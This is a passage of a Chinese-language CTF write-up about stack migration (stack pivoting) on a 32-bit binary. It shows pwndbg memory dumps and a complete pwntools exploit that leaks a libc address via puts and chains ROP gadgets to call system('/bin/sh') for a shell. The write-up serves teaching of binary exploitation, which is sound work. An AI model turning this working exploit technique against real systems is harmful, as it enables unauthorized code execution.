class="hljs-number">0</span>xffd33860 —▸ <span class="hljs-number">0</span>xeda2a000 (_GLOBAL_OFFSET_TABLE_) ◂— <span class="hljs-number">0</span>x229dac<br><span class="hljs-attribute">16</span>:<span class="hljs-number">0058</span>│+<span class="hljs-number">01</span>c <span class="hljs-number">0</span>xffd33864 —▸ <span class="hljs-number">0</span>x80484ab (main) ◂— push ebp<br></code></pre></td></tr></table></figure><p>从题目可以看出，main函数只给了我们一次输入的机会，也就是不能利用栈溢出来多次使用main函数</p><p>迁移rbp返回read，rbp偏移寻址，第二次输入的时候布置bss段栈帧， </p><p>vmmap查看bss段可用地址</p><p>payload2实现之后buf处的地址改变</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asm">pwndbg&gt; x/10gx 0x804a50c<br>0x804a50c:0x0804a4ccf6816b0c0xff8434a408049ff0<br>0x804a51c:0x08048504f6816b800x0804a40c00000000<br>0x804a52c:0x0000000a000001000x0000000000000000<br>0x804a53c:0x00000000000000000x0000000000000000<br>0x804a54c:0x00000000000000000x0000000000000000<br></code></pre></td></tr></table></figure><p>下面是执行完payload2之后的buf（所迁移的空间）处的内容</p><p>按照payload2&#x3D;p32(buf1){覆盖ebp为buf1，pop ebp时将栈迁移到buf1去，稍后能够执行buf1处的rop函数}<br>payload2+&#x3D;p32(puts_plt)<br>payload2+&#x3D;p32(pop_ebx_ret)<br>payload2+&#x3D;p32(puts_got)<br>payload2+&#x3D;p32(read_plt)<br>payload2+&#x3D;p32(leave_ret)<br>payload2+&#x3D;p32(0)<br>payload2+&#x3D;p32(buf1 )<br>payload2+&#x3D;p32(0x100)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asm">pwndbg&gt; x/10a 0x804a50c<br>0x804a50c:0x804a40c0x8048390 &lt;puts@plt&gt;0x804836d &lt;_init+33&gt;0x8049ff0<br>0x804a51c:0x8048380 &lt;read@plt&gt;0x8048504 &lt;main+89&gt;0x00x804a40c<br>0x804a52c:0x1000xa<br></code></pre></td></tr></table></figure><p>这时buf处已经写了我们需要泄露地址的函数，payload2的后面的再次调用read函数向新准备的buf1处的栈写rop内容，获取shell。</p><p>发送payload3之后buf1处的情况</p><p>payload3&#x3D;p32(buf)+p32(read_plt)+p32(pop_esi_edi_ebp_ret)+p32(0)+p32(buf)+p32(0x100)<br>payload3+&#x3D;p32(system_addr)+p32(0xdeadbeef)+p32(buf)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs asm">pwndbg&gt; x/10gx 0x804a40c<br>0x804a40c:0x080483800804a50c0x0000000008048569<br>0x804a41c:0x000001000804a50c0xdeadbeeff5648170<br>0x804a42c:0x0000000a0804a50c0x00000001f567d52b<br>0x804a43c:0x0000000408049ff00xf5828a60f582ada0<br>0x804a44c:0xf58283a0f582ade70xf582ada0f567c68e<br>pwndbg&gt; x/10a 0x804a40c<br>0x804a40c:0x804a50c0x8048380 &lt;read@plt&gt;0x8048569 &lt;__libc_csu_init+89&gt;0x0<br>0x804a41c:0x804a50c0x1000xf56481700xdeadbeef<br>0x804a42c:0x804a50c0xa<br><br></code></pre></td></tr></table></figure><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>a=process(<span class="hljs-string">&#x27;./migration&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./migration&#x27;</span>)<br>rop=ROP(<span class="hljs-string">&#x27;./migration&#x27;</span>)<br>read_plt=elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>gdb.attach(a)<br>pause()<br>libc=ELF(<span class="hljs-string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)<br>buf=elf.bss()+<span class="hljs-number">0x500</span><br>buf1=elf.bss()+<span class="hljs-number">0x400</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(elf.bss()))<br>leave_ret=<span class="hljs-number">0x08048504</span><br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;buf1=&quot;</span>+<span class="hljs-built_in">hex</span>(buf1))<br>pop_ebx_ret=<span class="hljs-number">0x0804836d</span><br><span class="hljs-comment">#0x0804836d : pop ebx ; ret</span><br>pop_esi_edi_ebp_ret=<span class="hljs-number">0x08048569</span><br><span class="hljs-comment">#0x08048569 : pop esi ; pop edi ; pop ebp ; ret</span><br><br>payload1=cyclic(<span class="hljs-number">0x28</span>)<span class="hljs-comment">#到达ebp</span><br>payload1+=p32(buf)<span class="hljs-comment">#pop ebp --&gt; new_buf_addr</span><br>payload1+=p32(read_plt)<span class="hljs-comment">#read函数覆盖的是main函数的返回地址，所以程序会先执行main函数结尾的leave和ret指令，形成了read（0,bss+0x500,0x100）的函数结构等待pop eip来执行</span><br><span class="hljs-comment">#eip指向read_plt执行read函数，在bss+0x500的地方读入payload2</span><br>payload1+=p32(leave_ret)<span class="hljs-comment">#read函数执行之后，再进行leave_ret，eip去执行leave（mov esp，ebp；）</span><br>payload1+=p32(<span class="hljs-number">0</span>)<span class="hljs-comment">#argv[1]</span><br>payload1+=p32(buf)<span class="hljs-comment">#argv[2]</span><br>payload1+=p32(<span class="hljs-number">0x100</span>)<span class="hljs-comment">#argv[3]</span><br><span class="hljs-comment">#debug()</span><br>a.sendafter(<span class="hljs-string">&#x27;Try your best :\n&#x27;</span>,payload1)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;*****************payload1 over*******************&quot;</span>)<br>payload2=p32(buf1)<br>payload2+=p32(puts_plt)<br>payload2+=p32(pop_ebx_ret)<br>payload2+=p32(puts_got)<br>payload2+=p32(read_plt)<br>payload2+=p32(leave_ret)<br>payload2+=p32(<span class="hljs-number">0</span>)<br>payload2+=p32(buf1 )<br>payload2+=p32(<span class="hljs-number">0x100</span>)<br><br><br>a.sendline(payload2)<br><br>puts_addr=u32(a.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts_addr))<br>libc_base=puts_addr-libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))<br>system_addr=libc_base+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh=libc_base+<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;*****************payload2 over*******************&quot;</span>)<br>payload3=p32(buf)+p32(system_addr)+p32(<span class="hljs-number">0xdeadbeef</span>)+p32(binsh)<br>debug()<br>a.sendline(payload3)<br>a.interactive()<br><br></code></pre></td></tr></table></figure><p>最后总结栈迁移：</p><p>原本栈不够用，通常通过leave ret指令转移栈，先覆盖到ebp，在ebp处填入准备好的新地址，pop ebp的时候，ebp就会到达新的地址，执行leave指令之后，mov ebp，esp，就会把esp也迁移到新的地址（在上面的payload1是buf），调用read函数准备往buf中写东西，需要三个参数，再次调用leave指令，因为本题需要泄露libc，所以我们去buf泄露libc，在这里的read函数并不会立刻执行，而是会先执行leave ret指令，然后eip指向read函数往buf中写东西，准备payload2，首先pop ebp 填入buf1的地址，让ebp先去定个位，然后调用puts_plt</p><p>函数，pop_ebx_ret是为了获取后面的got表中存的真正的地址，然后recv就可以接收到泄露的libc函数的地址，下一步要构造rop链，我们把栈迁移到buf处，还是利用leave ret指令，read去读入获取shell的rop链，这时侯执行完payload2之后，ebp和esp都在buf1处，我们随便pop ebp 这里我pop到buf处，然后调用system地址 给个虚假的返回地址，调用binsh 获得shell</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
